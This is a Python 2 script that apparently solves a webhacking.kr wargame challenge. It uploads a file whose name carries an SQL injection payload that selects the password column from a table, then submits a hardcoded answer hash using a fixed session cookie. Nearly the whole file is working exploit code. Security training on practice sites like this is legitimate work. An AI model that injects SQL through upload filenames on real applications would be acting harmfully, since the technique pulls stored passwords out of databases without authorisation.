#-*- coding: utf-8 -*-
import urllib
import urllib2

import requests

import CookieManager


ipAddress = ""
httpConnection = None
print "[+] Find IP Address"
try:
    httpRequest = urllib2.Request("https://api.ipify.org")
    httpConnection = urllib2.urlopen(httpRequest)
    ipAddress = httpConnection.read()
    print "[*] Your IP Address is [", ipAddress, "]"
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/challenge/web/web-14/index.php"
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")

uploadFile = {
    "upfile": ("bindon131',(select password from c29_tb),0x" + ipAddress.encode('hex') + ")-- ", "bindon")
}
sessionCookie = {
    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
}

httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": "70d8f5b353fa0fb765f04a67832ed57c"
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
